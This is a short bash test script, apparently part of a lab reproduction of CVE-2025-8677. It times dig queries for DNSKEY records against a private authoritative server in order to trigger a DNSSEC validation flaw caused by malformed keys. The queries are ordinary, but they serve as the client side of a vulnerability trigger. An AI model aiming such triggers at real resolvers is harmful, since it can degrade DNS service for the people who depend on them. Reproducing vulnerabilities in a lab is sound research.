#!/bin/bash
# Direct DNSSEC validation test using delv
# This explicitly attempts to validate DNSKEY records, triggering the vulnerability

set -e

AUTHORITATIVE="172.25.0.5"
DOMAIN="example.com"

echo "========================================="
echo "CVE-2025-8677 Direct Validation Test"
echo "========================================="
echo ""
echo "Testing direct DNSSEC validation of malformed DNSKEY records"
echo "Authoritative Server: $AUTHORITATIVE"
echo "Domain: $DOMAIN"
echo ""

# Query for DNSKEY records and measure time
echo "Querying for DNSKEY records..."
echo ""

# Simple dig query (no validation)
echo "1. Basic query (no validation):"
time dig @$AUTHORITATIVE $DOMAIN DNSKEY +short

echo ""
echo "2. Query with DNSSEC records (+dnssec):"
time dig @$AUTHORITATIVE $DOMAIN DNSKEY +dnssec +multi

echo ""
echo "3. Query with CD (checking disabled) flag:"
time dig @$AUTHORITATIVE $DOMAIN DNSKEY +dnssec +cd +multi

echo ""
echo "Test complete"
